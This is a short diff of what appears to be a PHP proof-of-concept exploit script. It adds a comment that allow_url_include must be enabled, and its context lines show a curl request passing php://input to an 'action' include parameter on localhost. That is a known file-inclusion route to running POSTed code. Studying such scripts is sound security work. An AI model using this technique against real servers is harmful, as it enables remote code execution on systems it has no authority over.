@@ -33,6 +33,7 @@ $page = curl_exec($ch);
 curl_close($ch);
 unset($ch);
 
+// for this to work you have to set allow_url_include = On in php.ini
 $ch = curl_init();
 $url = "http://localhost/index.php?action=php://input";
 curl_setopt($ch, CURLOPT_URL, $url);
